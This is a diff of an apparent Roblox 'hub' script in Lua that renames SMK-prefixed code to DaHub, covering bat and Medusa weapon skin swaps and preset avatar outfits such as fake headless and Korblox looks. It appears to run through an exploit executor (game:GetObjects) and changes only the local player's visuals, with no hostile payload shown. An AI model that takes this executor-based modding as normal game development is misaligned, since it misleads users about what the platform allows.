-                sound:SetAttribute("SMKOriginalSlashSound", nil)
+                sound:SetAttribute("DaHubOriginalSlashSound", nil)
             end
         end
     end
 end
 
-function SMKBatSkin.smkRestoreBatSkin(tool, clearOriginal)
-    if not SMKBatSkin.smkIsBat(tool) then return end
+function DaHubBatSkin.daHubRestoreBatSkin(tool, clearOriginal)
+    if not DaHubBatSkin.daHubIsBat(tool) then return end
     local handle = tool:FindFirstChild("Handle")
-    local original = SMKBatSkin.originals[tool]
+    local original = DaHubBatSkin.originals[tool]
     if handle then
         -- En Off no debe quedar visible ningún modelo, weld o parte de la skin.
         for _, child in ipairs(handle:GetChildren()) do
@@ -7608,22 +6986,22 @@ function SMKBatSkin.smkRestoreBatSkin(tool, clearOriginal)
         handle.Transparency = 0
     end
     if original and original.grip then tool.Grip = original.grip end
-    SMKBatSkin.smkSetBatSlashSound(tool, nil)
-    local soundConnection = SMKBatSkin.soundConnections[tool]
+    DaHubBatSkin.daHubSetBatSlashSound(tool, nil)
+    local soundConnection = DaHubBatSkin.soundConnections[tool]
     if clearOriginal ~= false and soundConnection then
         pcall(function() soundConnection:Disconnect() end)
-        SMKBatSkin.soundConnections[tool] = nil
+        DaHubBatSkin.soundConnections[tool] = nil
     end
-    if clearOriginal ~= false then SMKBatSkin.originals[tool] = nil end
+    if clearOriginal ~= false then DaHubBatSkin.originals[tool] = nil end
 end
 
-function SMKBatSkin.smkPrepareBatSkin(tool, entry)
-    if not SMKBatSkin.smkIsBat(tool) or not entry or not entry.id then return end
+function DaHubBatSkin.daHubPrepareBatSkin(tool, entry)
+    if not DaHubBatSkin.daHubIsBat(tool) or not entry or not entry.id then return end
     local toolHandle = tool:FindFirstChild("Handle")
     if not toolHandle then return end
 
-    if not SMKBatSkin.originals[tool] then
-        SMKBatSkin.originals[tool] = {
+    if not DaHubBatSkin.originals[tool] then
+        DaHubBatSkin.originals[tool] = {
             grip = tool.Grip,
             transparency = toolHandle.Transparency,
             canCollide = toolHandle.CanCollide,
@@ -7633,15 +7011,15 @@ function SMKBatSkin.smkPrepareBatSkin(tool, entry)
         }
     end
 
-    SMKBatSkin.smkRestoreBatSkin(tool, false)
+    DaHubBatSkin.daHubRestoreBatSkin(tool, false)
     for _, child in ipairs(toolHandle:GetChildren()) do
         if not child:IsA("Sound") then pcall(function() child:Destroy() end) end
     end
 
-    local katanaRoot = SMKBatSkin.smkLoadBatSkin(entry.id)
+    local katanaRoot = DaHubBatSkin.daHubLoadBatSkin(entry.id)
     if not katanaRoot then return end
     local modelClone = katanaRoot:Clone()
-    modelClone.Name = "SMKBatSkinModel"
+    modelClone.Name = "DaHubBatSkinModel"
     modelClone.Parent = toolHandle
 
     local srcHandle = modelClone:IsA("BasePart") and modelClone
@@ -7664,7 +7042,7 @@ function SMKBatSkin.smkPrepareBatSkin(tool, entry)
         part.Massless = true
         part.CFrame = toolHandle.CFrame * orientFix * relative
         local weld = Instance.new("Weld", part)
-        weld.Name = "SMKBatSkinWeld"
+        weld.Name = "DaHubBatSkinWeld"
         weld.Part0 = toolHandle
         weld.Part1 = part
         weld.C0 = orientFix * relative
@@ -7672,78 +7050,78 @@ function SMKBatSkin.smkPrepareBatSkin(tool, entry)
     end
     toolHandle.Transparency = 1
 
-    local previousSoundConnection = SMKBatSkin.soundConnections[tool]
+    local previousSoundConnection = DaHubBatSkin.soundConnections[tool]
     if previousSoundConnection then
         pcall(function() previousSoundConnection:Disconnect() end)
-        SMKBatSkin.soundConnections[tool] = nil
+        DaHubBatSkin.soundConnections[tool] = nil
     end
-    SMKBatSkin.smkSetBatSlashSound(tool, entry.soundId)
-    SMKBatSkin.soundConnections[tool] = tool.DescendantAdded:Connect(function(obj)
+    DaHubBatSkin.daHubSetBatSlashSound(tool, entry.soundId)
+    DaHubBatSkin.soundConnections[tool] = tool.DescendantAdded:Connect(function(obj)
         if S.batSkinMode == entry.name and obj:IsA("Sound") and obj.Name == "Slash" then
-            if obj:GetAttribute("SMKOriginalSlashSound") == nil then
-                obj:SetAttribute("SMKOriginalSlashSound", obj.SoundId)
+            if obj:GetAttribute("DaHubOriginalSlashSound") == nil then
+                obj:SetAttribute("DaHubOriginalSlashSound", obj.SoundId)
             end
             obj.SoundId = entry.soundId
         end
     end)
 end
 
-function SMKBatSkin.smkApplyBatSkin(tool)
-    if not SMKBatSkin.smkIsBat(tool) then return end
+function DaHubBatSkin.daHubApplyBatSkin(tool)
+    if not DaHubBatSkin.daHubIsBat(tool) then return end
     if S.batSkinMode == "Off" then
-        SMKBatSkin.smkRestoreBatSkin(tool)
+        DaHubBatSkin.daHubRestoreBatSkin(tool)
         return
     end
     local entry
     for _, candidate in ipairs(DAHUB_BAT_SKINS) do
         if candidate.name == S.batSkinMode then entry = candidate; break end
     end
-    if entry then SMKBatSkin.smkPrepareBatSkin(tool, entry) end
+    if entry then DaHubBatSkin.daHubPrepareBatSkin(tool, entry) end
 end
 
-function SMKBatSkin.smkScanBatSkins(parent)
+function DaHubBatSkin.daHubScanBatSkins(parent)
     if not parent then return end
     for _, child in ipairs(parent:GetChildren()) do
-        if SMKBatSkin.smkIsBat(child) then task.spawn(SMKBatSkin.smkApplyBatSkin, child) end
+        if DaHubBatSkin.daHubIsBat(child) then task.spawn(DaHubBatSkin.daHubApplyBatSkin, child) end
     end
 end
 
-function SMKBatSkin.smkWatchBatSkinContainer(parent)
-    if not parent or SMKBatSkin.watched[parent] then return end
-    SMKBatSkin.watched[parent] = true
+function DaHubBatSkin.daHubWatchBatSkinContainer(parent)
+    if not parent or DaHubBatSkin.watched[parent] then return end
+    DaHubBatSkin.watched[parent] = true
     table.insert(S.batSkinConnections, parent.ChildAdded:Connect(function(child)
         task.wait(0.1)
-        if SMKBatSkin.smkIsBat(child) then SMKBatSkin.smkApplyBatSkin(child) end
+        if DaHubBatSkin.daHubIsBat(child) then DaHubBatSkin.daHubApplyBatSkin(child) end
     end))
-    SMKBatSkin.smkScanBatSkins(parent)
+    DaHubBatSkin.daHubScanBatSkins(parent)
 end
 
-function SMKBatSkin.smkWatchBatSkinCharacter(character)
-    SMKBatSkin.smkWatchBatSkinContainer(character)
-    SMKBatSkin.smkWatchBatSkinContainer(LP:FindFirstChildOfClass("Backpack"))
+function DaHubBatSkin.daHubWatchBatSkinCharacter(character)
+    DaHubBatSkin.daHubWatchBatSkinContainer(character)
+    DaHubBatSkin.daHubWatchBatSkinContainer(LP:FindFirstChildOfClass("Backpack"))
     if S.batSkinMode ~= "Off" then
         task.delay(0.35, function()
             if LP.Character == character then
-                SMKBatSkin.smkScanBatSkins(character)
-                SMKBatSkin.smkScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
+                DaHubBatSkin.daHubScanBatSkins(character)
+                DaHubBatSkin.daHubScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
             end
         end)
     end
 end
 
-function SMKBatSkin.smkSetBatSkin(mode, shouldSave)
+function DaHubBatSkin.daHubSetBatSkin(mode, shouldSave)
     local valid = false
     for _, entry in ipairs(DAHUB_BAT_SKINS) do
         if entry.name == mode then valid = true; break end
     end
     S.batSkinMode = valid and mode or "Off"
-    SMKBatSkin.smkScanBatSkins(LP.Character)
-    SMKBatSkin.smkScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
+    DaHubBatSkin.daHubScanBatSkins(LP.Character)
+    DaHubBatSkin.daHubScanBatSkins(LP:FindFirstChildOfClass("Backpack"))
     if S.batSkinSelectorLabel then S.batSkinSelectorLabel.Text = S.batSkinMode end
     if shouldSave then saveConfig() end
 end
 
-function SMKBatSkin.smkCycleBatSkin(direction)
+function DaHubBatSkin.daHubCycleBatSkin(direction)
     local index = 1
     for i, entry in ipairs(DAHUB_BAT_SKINS) do
         if entry.name == S.batSkinMode then index = i; break end
@@ -7751,33 +7129,33 @@ function SMKBatSkin.smkCycleBatSkin(direction)
     index = index + (direction or 1)
     if index < 1 then index = #DAHUB_BAT_SKINS end
     if index > #DAHUB_BAT_SKINS then index = 1 end
-    SMKBatSkin.smkSetBatSkin(DAHUB_BAT_SKINS[index].name, true)
+    DaHubBatSkin.daHubSetBatSkin(DAHUB_BAT_SKINS[index].name, true)
 end
 
-S.setBatSkin = SMKBatSkin.smkSetBatSkin
-S.cycleBatSkin = SMKBatSkin.smkCycleBatSkin
+S.setBatSkin = DaHubBatSkin.daHubSetBatSkin
+S.cycleBatSkin = DaHubBatSkin.daHubCycleBatSkin
 
 LP.CharacterAdded:Connect(function(character)
     task.wait(0.2)
-    SMKBatSkin.smkWatchBatSkinCharacter(character)
+    DaHubBatSkin.daHubWatchBatSkinCharacter(character)
 end)
 LP.ChildAdded:Connect(function(child)
-    if child:IsA("Backpack") then SMKBatSkin.smkWatchBatSkinContainer(child) end
+    if child:IsA("Backpack") then DaHubBatSkin.daHubWatchBatSkinContainer(child) end
 end)
-SMKBatSkin.smkWatchBatSkinCharacter(LP.Character)
+DaHubBatSkin.daHubWatchBatSkinCharacter(LP.Character)
 end
 
 -- ==================== PRIME.VS MEDUSA COSMETIC ====================
 do
-SMKMedusaSkin = {watched = setmetatable({}, {__mode="k"})}
-function SMKMedusaSkin.load(assetId)
+DaHubMedusaSkin = {watched = setmetatable({}, {__mode="k"})}
+function DaHubMedusaSkin.load(assetId)
     local ok, objects = pcall(function() return game:GetObjects("rbxassetid://" .. tostring(assetId)) end)
     if ok and type(objects)=="table" and #objects>0 then return objects end
     local loaded
     pcall(function() loaded=game:GetService("InsertService"):LoadAsset(tonumber(assetId)) end)
     return loaded and {loaded} or nil
 end
-local function SMKClearMedusaVisual(tool)
+local function DaHubClearMedusaVisual(tool)
 if not tool then return end
 pcall(function()
 local folder = tool:FindFirstChild("Hub073GearVisual")
@@ -7798,7 +7176,7 @@ end
 end
 end)
 end
-local function SMKApplyMedusaAsset(tool, assetId)
+local function DaHubApplyMedusaAsset(tool, assetId)
 if not tool or not assetId then return false end
 if tool:GetAttribute("Hub073Applying") then return false end
 tool:SetAttribute("Hub073Applying", true)
@@ -7810,11 +7188,11 @@ return false
 end
 local success = false
 pcall(function()
-SMKClearMedusaVisual(tool)
+DaHubClearMedusaVisual(tool)
 if tool:GetAttribute("Hub073OrigHandleTrans") == nil then
 tool:SetAttribute("Hub073OrigHandleTrans", handle.Transparency)
 end
-local objs = SMKMedusaSkin.load(assetId)
+local objs = DaHubMedusaSkin.load(assetId)
 if not objs or #objs == 0 then return end
 local folder = Instance.new("Folder")
 folder.Name = "Hub073GearVisual"
@@ -7925,41 +7303,41 @@ tool:SetAttribute("Hub073Applying", nil)
 return success
 end
 
-function SMKMedusaSkin.apply(tool)
+function DaHubMedusaSkin.apply(tool)
     if not tool or not tool:IsA("Tool") or not tool.Name:lower():find("medusa",1,true) then return end
     if S.medusaSkinMode == "Medusa 1" then
-        SMKApplyMedusaAsset(tool,11563251)
+        DaHubApplyMedusaAsset(tool,11563251)
     else
-        SMKClearMedusaVisual(tool)
+        DaHubClearMedusaVisual(tool)
     end
 end
-function SMKMedusaSkin.scan(parent)
+function DaHubMedusaSkin.scan(parent)
     if not parent then return end
-    for _, tool in ipairs(parent:GetChildren()) do task.spawn(SMKMedusaSkin.apply,tool) end
+    for _, tool in ipairs(parent:GetChildren()) do task.spawn(DaHubMedusaSkin.apply,tool) end
 end
-function SMKMedusaSkin.watch(parent)
-    if not parent or SMKMedusaSkin.watched[parent] then return end
-    SMKMedusaSkin.watched[parent]=true
-    parent.ChildAdded:Connect(function(tool) task.wait(0.15); SMKMedusaSkin.apply(tool) end)
-    SMKMedusaSkin.scan(parent)
+function DaHubMedusaSkin.watch(parent)
+    if not parent or DaHubMedusaSkin.watched[parent] then return end
+    DaHubMedusaSkin.watched[parent]=true
+    parent.ChildAdded:Connect(function(tool) task.wait(0.15); DaHubMedusaSkin.apply(tool) end)
+    DaHubMedusaSkin.scan(parent)
 end
-function SMKMedusaSkin.set(mode,shouldSave)
+function DaHubMedusaSkin.set(mode,shouldSave)
     S.medusaSkinMode=mode=="Medusa 1" and "Medusa 1" or "Off"
-    SMKMedusaSkin.scan(LP.Character)
-    SMKMedusaSkin.scan(LP:FindFirstChildOfClass("Backpack"))
+    DaHubMedusaSkin.scan(LP.Character)
+    DaHubMedusaSkin.scan(LP:FindFirstChildOfClass("Backpack"))
     if S.medusaSkinSelectorLabel then S.medusaSkinSelectorLabel.Text=S.medusaSkinMode end
     if shouldSave then saveConfig() end
 end
-S.setMedusaSkin=SMKMedusaSkin.set
-LP.CharacterAdded:Connect(function(character) SMKMedusaSkin.watch(character) end)
-LP.ChildAdded:Connect(function(child) if child:IsA("Backpack") then SMKMedusaSkin.watch(child) end end)
-SMKMedusaSkin.watch(LP.Character)
-SMKMedusaSkin.watch(LP:FindFirstChildOfClass("Backpack"))
+S.setMedusaSkin=DaHubMedusaSkin.set
+LP.CharacterAdded:Connect(function(character) DaHubMedusaSkin.watch(character) end)
+LP.ChildAdded:Connect(function(child) if child:IsA("Backpack") then DaHubMedusaSkin.watch(child) end end)
+DaHubMedusaSkin.watch(LP.Character)
+DaHubMedusaSkin.watch(LP:FindFirstChildOfClass("Backpack"))
 end
 
 -- ==================== DAHUB DISPLAY MODE / COMPLETE SKINS ====================
 do
-SMKDisplaySkin = {}
+DaHubDisplaySkin = {}
 DAHUB_SKIN_ORDER = {"Off", "PURPLE", "BLUE", "RED", "BLACK", "GREEN", "WHITE", "BLEED 1", "BLEED 2", "BLEED 3", "BLEED 4", "BLEED 5"}
 DAHUB_SKIN_SETS = {
     ["BLEED 1"] = {accessories={306969564}, headless=false, korblox="Right", shirtTemplate="rbxassetid://10632503795", pantsTemplate="rbxassetid://123161592384863", headMesh="rbxassetid://134079402", headTexture="rbxassetid://133940918", color=Color3.fromRGB(255,255,255)},
@@ -7967,12 +7345,12 @@ DAHUB_SKIN_SETS = {
     ["BLEED 3"] = {accessories={112564966849233}, headless=false, korblox="Right", shirtTemplate="rbxassetid://11849088376", pantsTemplate="rbxassetid://16534673928", headMesh="rbxassetid://134079402", headTexture="rbxassetid://133940918", color=Color3.fromRGB(255,255,255)},
     ["BLEED 4"] = {accessories={10159600649}, headless=false, korblox="Off", shirtTemplate="rbxassetid://9683332638", pantsTemplate="rbxassetid://93182020184041", headMesh="rbxassetid://134079402", headTexture="rbxassetid://133940918", color=Color3.fromRGB(255,255,255)},
     ["BLEED 5"] = {accessories={8349240186}, headless=false, korblox="Off", shirtTemplate="rbxassetid://11926549070", pantsTemplate="rbxassetid://13189494471", headMesh="rbxassetid://16673245747", headTexture=nil, color=Color3.fromRGB(255,255,255)},
-    PURPLE = {hats="1744060292,439945661,1125510,1029025", hair="", headless=true, korblox="Right", accessories={1744060292,439945661,1125510,1029025,11748356,8465506143,11444217173}, clothing={7424637509,7689651773}, color=SMKThemeRGB(200, 200, 200)},
-    BLUE = {hats="74891470", hair="16630147,6346833550,6594911228,6594919952,6823338112,7097747842", headless=true, korblox="Right", accessories={74891470,16630147,6346833550,6594911228,6594919952,6823338112,7097747842}, clothing={18423061209,18423154566}, color=SMKThemeRGB(55,145,255)},
-    RED = {hats="215718515,439945661", hair="7183785281", headless=true, korblox="Right", accessories={215718515,439945661,7183785281}, clothing={15998365201,7689651773}, color=SMKThemeRGB(235,62,72)},
-    BLACK = {hats="10159600649,439946249,17798262442,92482095662016", hair="139101716417676", headless=true, korblox="Right", accessories={10159600649,439946249,17798262442,92482095662016,139101716417676,12490213797}, clothing={18766106994,13925390578}, color=SMKThemeRGB(24,24,30)},
-    GREEN = {hats="553970961,1744060292", hair="93268856876777", headless=true, korblox="Right", accessories={553970961,1744060292,93268856876777}, clothing={9478068776,6348682339}, color=SMKThemeRGB(62,210,112)},
-    WHITE = {hats="74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,88365652378427", hair="126447390530523", headless=true, korblox="Right", accessories={74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,126447390530523}, clothing={88032876921227,108259950755140}, color=SMKThemeRGB(238,238,244)},
+    PURPLE = {hats="1744060292,439945661,1125510,1029025", hair="", headless=true, korblox="Right", accessories={1744060292,439945661,1125510,1029025,11748356,8465506143,11444217173}, clothing={7424637509,7689651773}, color=DaHubThemeRGB(200, 200, 200)},
+    BLUE = {hats="74891470", hair="16630147,6346833550,6594911228,6594919952,6823338112,7097747842", headless=true, korblox="Right", accessories={74891470,16630147,6346833550,6594911228,6594919952,6823338112,7097747842}, clothing={18423061209,18423154566}, color=DaHubThemeRGB(55,145,255)},
+    RED = {hats="215718515,439945661", hair="7183785281", headless=true, korblox="Right", accessories={215718515,439945661,7183785281}, clothing={15998365201,7689651773}, color=DaHubThemeRGB(235,62,72)},
+    BLACK = {hats="10159600649,439946249,17798262442,92482095662016", hair="139101716417676", headless=true, korblox="Right", accessories={10159600649,439946249,17798262442,92482095662016,139101716417676,12490213797}, clothing={18766106994,13925390578}, color=DaHubThemeRGB(24,24,30)},
+    GREEN = {hats="553970961,1744060292", hair="93268856876777", headless=true, korblox="Right", accessories={553970961,1744060292,93268856876777}, clothing={9478068776,6348682339}, color=DaHubThemeRGB(62,210,112)},
+    WHITE = {hats="74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,88365652378427", hair="126447390530523", headless=true, korblox="Right", accessories={74891470,215718515,439945661,1016143686,1744060292,10159600649,89012651581593,126447390530523}, clothing={88032876921227,108259950755140}, color=DaHubThemeRGB(238,238,244)},
 }
 DAHUB_ASSET_PROPERTIES = {
     [1744060292]="HatAccessory", [439945661]="HatAccessory", [1125510]="HatAccessory", [1029025]="HatAccessory", [8465506143]="HatAccessory", [74891470]="HatAccessory", [215718515]="HatAccessory", [10159600649]="HatAccessory", [439946249]="HatAccessory", [17798262442]="HatAccessory", [92482095662016]="HatAccessory", [553970961]="HatAccessory", [1016143686]="HatAccessory", [89012651581593]="HatAccessory", [88365652378427]="HatAccessory",
@@ -7981,23 +7359,23 @@ DAHUB_ASSET_PROPERTIES = {
     [7424637509]="Shirt", [18423061209]="Shirt", [15998365201]="Shirt", [18766106994]="Shirt", [9478068776]="Shirt", [88032876921227]="Shirt",
     [7689651773]="Pants", [18423154566]="Pants", [13925390578]="Pants", [6348682339]="Pants", [108259950755140]="Pants",
 }
-SMKOriginalDescriptions = setmetatable({}, {__mode="k"})
-SMKOriginalOutfits = setmetatable({}, {__mode="k"})
+DaHubOriginalDescriptions = setmetatable({}, {__mode="k"})
+DaHubOriginalOutfits = setmetatable({}, {__mode="k"})
 
-function SMKDisplaySkin.assetInSet(id, setData)
+function DaHubDisplaySkin.assetInSet(id, setData)
     id=tonumber(id); if not id or not setData then return false end
     for _,v in ipairs(setData.accessories or {}) do if id==v then return true end end
     for _,v in ipairs(setData.clothing or {}) do if id==v then return true end end
     return false
 end
-function SMKDisplaySkin.appendDescriptionAsset(description, id)
+function DaHubDisplaySkin.appendDescriptionAsset(description, id)
     local property=DAHUB_ASSET_PROPERTIES[tonumber(id)]
     if not property then return end
     if property=="Shirt" or property=="Pants" then description[property]=tonumber(id); return end
     local old=tostring(description[property] or "")
     if not old:find(tostring(id),1,true) then description[property]=(old=="" and tostring(id) or old..","..tostring(id)) end
 end
-function SMKDisplaySkin.buildDescription(setName, character)
+function DaHubDisplaySkin.buildDescription(setName, character)
     local setData=DAHUB_SKIN_SETS[setName]; if not setData then return nil end
     local humanoid=character and character:FindFirstChildOfClass("Humanoid"); if not humanoid then return nil end
     local description
@@ -8006,11 +7384,11 @@ function SMKDisplaySkin.buildDescription(setName, character)
     if not description then description=Instance.new("HumanoidDescription") end
     for _,property in ipairs({"HatAccessory","HairAccessory","FaceAccessory","NeckAccessory","ShouldersAccessory","FrontAccessory","BackAccessory","WaistAccessory","ShirtAccessory","PantsAccessory","JacketAccessory","SweaterAccessory","ShortsAccessory","TShirtAccessory","DressSkirtAccessory"}) do pcall(function() description[property]="" end) end
     pcall(function() description.Shirt=0; description.Pants=0; description.GraphicTShirt=0; description.HatAccessory=setData.hats or ""; description.HairAccessory=setData.hair or "" end)
-    for _,id in ipairs(setData.accessories or {}) do SMKDisplaySkin.appendDescriptionAsset(description,id) end
-    for _,id in ipairs(setData.clothing or {}) do SMKDisplaySkin.appendDescriptionAsset(description,id) end
+    for _,id in ipairs(setData.accessories or {}) do DaHubDisplaySkin.appendDescriptionAsset(description,id) end
+    for _,id in ipairs(setData.clothing or {}) do DaHubDisplaySkin.appendDescriptionAsset(description,id) end
     return description
 end
-function SMKDisplaySkin.applyDescription(humanoid, description)
+function DaHubDisplaySkin.applyDescription(humanoid, description)
     if not humanoid or not description then return false end
     for _,methodName in ipairs({"ApplyDescriptionClientServer","ApplyDescriptionReset","ApplyDescription"}) do
         local method
@@ -8021,8 +7399,8 @@ function SMKDisplaySkin.applyDescription(humanoid, description)
     end
     return false
 end
-function SMKDisplaySkin.captureOriginalOutfit(character)
-    if SMKOriginalOutfits[character] then return end
+function DaHubDisplaySkin.captureOriginalOutfit(character)
+    if DaHubOriginalOutfits[character] then return end
     local saved={}
     for _,child in ipairs(character:GetChildren()) do
         if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
@@ -8030,10 +7408,10 @@ function SMKDisplaySkin.captureOriginalOutfit(character)
             if ok and clone then saved[#saved+1]=clone end
         end
     end
-    SMKOriginalOutfits[character]=saved
+    DaHubOriginalOutfits[character]=saved
 end
-function SMKDisplaySkin.restoreOriginalOutfit(character)
-    local saved=SMKOriginalOutfits[character]
+function DaHubDisplaySkin.restoreOriginalOutfit(character)
+    local saved=DaHubOriginalOutfits[character]
     if not saved then return end
     for _,child in ipairs(character:GetChildren()) do
         if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then pcall(function() child:Destroy() end) end
@@ -8041,39 +7419,39 @@ function SMKDisplaySkin.restoreOriginalOutfit(character)
     local humanoid=character:FindFirstChildOfClass("Humanoid")
     for _,clone in ipairs(saved) do
         local copy=clone:Clone()
-        if copy:IsA("Accessory") and humanoid then SMKDisplaySkin.attachAccessory(character,humanoid,copy) else copy.Parent=character end
+        if copy:IsA("Accessory") and humanoid then DaHubDisplaySkin.attachAccessory(character,humanoid,copy) else copy.Parent=character end
     end
 end
 
-function SMKDisplaySkin.clearMarked(character)
+function DaHubDisplaySkin.clearMarked(character)
     for _,child in ipairs(character:GetChildren()) do
-        if child:GetAttribute("SMKCompleteSkin") then pcall(function() child:Destroy() end) end
+        if child:GetAttribute("DaHubCompleteSkin") then pcall(function() child:Destroy() end) end
     end
 end
-function SMKDisplaySkin.markAndColor(character, setData)
+function DaHubDisplaySkin.markAndColor(character, setData)
     for _,child in ipairs(character:GetChildren()) do
         if child:IsA("Accessory") or child:IsA("Accoutrement") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
             local id
             pcall(function() id=tonumber(child.SourceAssetId) end)
-            if SMKDisplaySkin.assetInSet(id,setData) then child:SetAttribute("SMKCompleteSkin",true) end
+            if DaHubDisplaySkin.assetInSet(id,setData) then child:SetAttribute("DaHubCompleteSkin",true) end
         end
     end
     for _,descendant in ipairs(character:GetDescendants()) do
         if descendant:IsA("BasePart") then
             local parent=descendant
             while parent and parent~=character do
-                if parent:GetAttribute("SMKCompleteSkin") then descendant.Color=setData.color; break end
+                if parent:GetAttribute("DaHubCompleteSkin") then descendant.Color=setData.color; break end
                 parent=parent.Parent
             end
         end
     end
 end
-function SMKDisplaySkin.setHeadless(character, enabled)
+function DaHubDisplaySkin.setHeadless(character, enabled)
     local head=character and character:FindFirstChild("Head"); if not head then return end
     local transparency=enabled and 1 or 0; head.Transparency=transparency; head.LocalTransparencyModifier=transparency
     for _,child in ipairs(head:GetChildren()) do if child:IsA("Decal") or child:IsA("Texture") then child.Transparency=transparency end end
 end
-function SMKDisplaySkin.attachAccessory(character, humanoid, accessory)
+function DaHubDisplaySkin.attachAccessory(character, humanoid, accessory)
     local handle=accessory:FindFirstChild("Handle",true)
     pcall(function() humanoid:AddAccessory(accessory) end)
     if not accessory.Parent then accessory.Parent=character end
@@ -8087,25 +7465,25 @@ function SMKDisplaySkin.attachAccessory(character, humanoid, accessory)
     if targetAttachment and targetAttachment.Parent:IsA("BasePart") then
         handle.Anchored=false; handle.CanCollide=false; handle.CanTouch=false; handle.CanQuery=false; handle.Massless=true
         handle.CFrame=targetAttachment.Parent.CFrame*targetAttachment.CFrame*handleAttachment.CFrame:Inverse()
-        if not handle:FindFirstChild("SMKAccessoryWeld") then
-            local weld=Instance.new("WeldConstraint"); weld.Name="SMKAccessoryWeld"; weld.Part0=targetAttachment.Parent; weld.Part1=handle; weld.Parent=handle
+        if not handle:FindFirstChild("DaHubAccessoryWeld") then
+            local weld=Instance.new("WeldConstraint"); weld.Name="DaHubAccessoryWeld"; weld.Part0=targetAttachment.Parent; weld.Part1=handle; weld.Parent=handle
         end
     end
     return accessory.Parent==character
 end
-function SMKDisplaySkin.hasAsset(character, assetId)
+function DaHubDisplaySkin.hasAsset(character, assetId)
     assetId=tonumber(assetId)
     for _,child in ipairs(character:GetChildren()) do
         local sourceId
         pcall(function() sourceId=tonumber(child.SourceAssetId) end)
         if assetId and assetId>0 then
-            if sourceId==assetId or tonumber(child:GetAttribute("SMKSkinAssetId"))==assetId then return true end
+            if sourceId==assetId or tonumber(child:GetAttribute("DaHubSkinAssetId"))==assetId then return true end
         end
     end
     return false
 end
-function SMKDisplaySkin.addAsset(character, humanoid, assetId)
-    if SMKDisplaySkin.hasAsset(character,assetId) then return true end
+function DaHubDisplaySkin.addAsset(character, humanoid, assetId)
+    if DaHubDisplaySkin.hasAsset(character,assetId) then return true end
     local ok, objects=pcall(function() return game:GetObjects("rbxassetid://"..tostring(assetId)) end)
     if not ok or type(objects)~="table" or #objects==0 then
         local loaded
@@ -8120,11 +7498,11 @@ function SMKDisplaySkin.addAsset(character, humanoid, assetId)
             if descendant:IsA("Accessory") or descendant:IsA("Shirt") or descendant:IsA("Pants") or descendant:IsA("ShirtGraphic") then table.insert(candidates,descendant) end
         end
         for _,source in ipairs(candidates) do
-            local clone=source:Clone(); clone:SetAttribute("SMKCompleteSkin",true); clone:SetAttribute("SMKSkinAssetId",tonumber(assetId))
+            local clone=source:Clone(); clone:SetAttribute("DaHubCompleteSkin",true); clone:SetAttribute("DaHubSkinAssetId",tonumber(assetId))
             if clone:IsA("Accessory") then
-                if SMKDisplaySkin.attachAccessory(character,humanoid,clone) then added=true end
+                if DaHubDisplaySkin.attachAccessory(character,humanoid,clone) then added=true end
             else
-                for _,old in ipairs(character:GetChildren()) do if old.ClassName==clone.ClassName and old:GetAttribute("SMKCompleteSkin") then old:Destroy() end end
+                for _,old in ipairs(character:GetChildren()) do if old.ClassName==clone.ClassName and old:GetAttribute("DaHubCompleteSkin") then old:Destroy() end end
                 clone.Parent=character; added=true
             end
         end
@@ -8133,7 +7511,7 @@ function SMKDisplaySkin.addAsset(character, humanoid, assetId)
     return added
 end
 
-function SMKDisplaySkin.applyAccessories(character, humanoid, description, setData)
+function DaHubDisplaySkin.applyAccessories(character, humanoid, description, setData)
     local source
     pcall(function() source=Players:CreateHumanoidModelFromDescriptionAsync(description,Enum.HumanoidRigType.R15) end)
     if not source then pcall(function() source=Players:CreateHumanoidModelFromDescription(description,Enum.HumanoidRigType.R15) end) end
@@ -8142,129 +7520,129 @@ function SMKDisplaySkin.applyAccessories(character, humanoid, description, setDa
         if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then
             if child:IsA("Accessory") then
                 local sourceId; pcall(function() sourceId=tonumber(child.SourceAssetId) end)
-                if not SMKDisplaySkin.hasAsset(character,sourceId) then
-                    local clone=child:Clone(); clone:SetAttribute("SMKCompleteSkin",true); clone:SetAttribute("SMKSkinAssetId",sourceId)
-                    SMKDisplaySkin.attachAccessory(character,humanoid,clone)
+                if not DaHubDisplaySkin.hasAsset(character,sourceId) then
+                    local clone=child:Clone(); clone:SetAttribute("DaHubCompleteSkin",true); clone:SetAttribute("DaHubSkinAssetId",sourceId)
+                    DaHubDisplaySkin.attachAccessory(character,humanoid,clone)
                 end
             else
                 for _,current in ipairs(character:GetChildren()) do if current.ClassName==child.ClassName then pcall(function() current:Destroy() end) end end
-                local clone=child:Clone(); clone:SetAttribute("SMKCompleteSkin",true); clone.Parent=character
+                local clone=child:Clone(); clone:SetAttribute("DaHubCompleteSkin",true); clone.Parent=character
             end
         end
     end
-    source:Destroy(); SMKDisplaySkin.markAndColor(character,setData)
+    source:Destroy(); DaHubDisplaySkin.markAndColor(character,setData)
 end
 
-function SMKDisplaySkin.apply(token)
+function DaHubDisplaySkin.apply(token)
     token=token or S._skinApplyToken
     local character=LP.Character; local setName=S.displaySkin
     if token~=S._skinApplyToken or not character or setName=="Off" or not S.customSkinEnabled then return end
     local humanoid=character:FindFirstChildOfClass("Humanoid"); local setData=DAHUB_SKIN_SETS[setName]
     if not humanoid or not setData then return end
-    if not SMKOriginalDescriptions[character] then pcall(function() SMKOriginalDescriptions[character]=humanoid:GetAppliedDescription():Clone() end) end
-    SMKDisplaySkin.captureOriginalOutfit(character)
+    if not DaHubOriginalDescriptions[character] then pcall(function() DaHubOriginalDescriptions[character]=humanoid:GetAppliedDescription():Clone() end) end
+    DaHubDisplaySkin.captureOriginalOutfit(character)
     local originalHead=character:FindFirstChild("Head")
     local originalMesh=originalHead and originalHead:FindFirstChildOfClass("SpecialMesh")
-    if originalMesh and originalHead:GetAttribute("SMKOriginalHeadMesh")~=nil then
-        originalMesh.MeshId=originalHead:GetAttribute("SMKOriginalHeadMesh")
-        originalMesh.TextureId=originalHead:GetAttribute("SMKOriginalHeadTexture") or ""
